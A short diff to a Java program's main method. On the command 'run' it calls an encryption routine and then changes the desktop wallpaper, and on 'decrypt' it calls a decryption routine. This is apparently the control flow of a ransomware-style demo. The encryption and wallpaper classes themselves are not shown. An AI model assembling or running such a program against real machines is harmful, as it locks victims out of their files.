@@ -7,8 +7,10 @@ public class Main {
         Scanner sc = new Scanner(System.in);
         String verify = sc.nextLine();
         if (verify.equals("run")) {
-            System.out.println("Ok");
+            System.out.println("Encrypting...");
             Encrypt.runEncryption();
+            System.out.println("Change Wallpaper");
+            WallpaperChanger.main();
             System.out.println("Done");
         } else if (verify.equals("decrypt")) {
             Decrypt.runDecryption();
